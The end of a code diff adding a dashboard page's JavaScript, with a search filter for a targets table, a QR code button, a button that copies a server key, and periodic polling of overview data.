+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── Search targets ──
+document.getElementById('target-search')?.addEventListener('input', function(){
+    const q = this.value.toLowerCase();
+    document.querySelectorAll('#targets-table tr').forEach(tr => {
+        tr.style.display = tr.textContent.toLowerCase().includes(q) ? '' : 'none';
+    });
+});
+
+// ── QR code ──
+document.getElementById('qr-btn')?.addEventListener('click', function(){
+    const url = document.getElementById('qr-url').value;
+    window.open('https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(url), '_blank');
+});
+
+// ── Settings ──
+document.getElementById('srv-copy')?.addEventListener('click', function(){
+    const el = document.getElementById('srv-key');
+    el.type = 'text';
+    el.select();
+    document.execCommand('copy');
+    el.type = 'password';
+    this.textContent = 'Copié ✓';
+    setTimeout(() => this.textContent = 'Copier', 2000);
+});
+
+// ── Init ──
+loadOverview();
+loadLive();
+
+// Poll overview every 30s
+setInterval(loadOverview, 30000);
+</script>
+</body>
+</html>
